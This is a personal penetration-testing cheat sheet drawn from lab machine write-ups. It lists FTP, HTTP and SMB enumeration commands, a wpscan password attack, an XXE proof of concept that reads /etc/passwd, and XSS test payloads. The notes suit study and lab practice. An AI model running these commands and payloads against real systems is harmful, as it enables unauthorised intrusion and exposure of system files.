---
title: "Pentesting CheatSheet"
author: "Me"
date: "November 03, 2021"
output: html_document
---

# Pentesting CheatSheet
{:.no_toc}

This "CheatSheet" aims to provide a global vision of the various tools and techniques used in the writeups, so that I can easily reuse them (there are links to machines).

Here's the content so far:

1. TOC
{:toc}
{:style="color:black; font-size: 150%;"}

# 21 - FTP

- Check if anonymous FTP is allowed (user *anonymous*, blank password)
- Known vulnerable versions: ProFTPD 1.3.3c, vsFTPd 2.3.4

# 80 - HTTP

## Directories and files enumeration

- Directories and files enumeration with **dirb** (-r for non recursive):

````
sudo dirb http://targetIP -r
``````

- Directories and files enumeration with **gobuster**:

````
sudo gobuster dir -u http://targetIP/ -w /usr/share/wordlists/...wordlist
sudo gobuster dir -u http://targetIP/ -w /usr/share/wordlists/...wordlist -x php # looks for php files
``````
Example: BountyHunter

- Directories and files enumeration with **wpscan** (for Wordpress):

````
sudo wpscan --url targetIP # basic scan
sudo wpscan --url targetIP -e u # enumerate users
sudo wpscan --url targetIP -passwords file/path/passwords.txt # password attack
`````
Example: Basic Pentesting: 1

- If the CMS is Wordpress: check **wp_admin_shell_upload**. Example: Basic Pentesting: 1


## XXE Injection

Does the application parses XML? If yes, it might be vulnerable to XXE injection. POC:

````
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
`````

Example: BountyHunter


## SQL Injection

## XXS (cross-site scripting)

- Stored XXS: query stored in a database. Detection: input something like <script>alert('test')</script> in a field, submit it and refresh the page. If the browser interprets it, it should open a JavaScript pop-up alert.
- Reflected XXS: same principle, but the script isn't stored in a database. Instead, it is passed through the URL. Example: if the site/application has a research field, it does an http GET request with an URL parameter (*https://www.insecure.com/search?q=keyboard*). Detection: inject something like https://www.insecure.com/search?q=<script>alert</script>. We can then send this link to someone.

## CSRF (cross-site request forgery)

Principle: do http requests as the victim.

## Login Bruteforcing

# 139, 445 - SMB

- SMB (Server Message Block, protocol to share resources on Windows local networks) enumeration and null sessions:

````
sudo nmblookup -A targetIP
sudo nbtscan targetIP
sudo smbclient -L targetIP
sudo smbmap -H targetIP
````


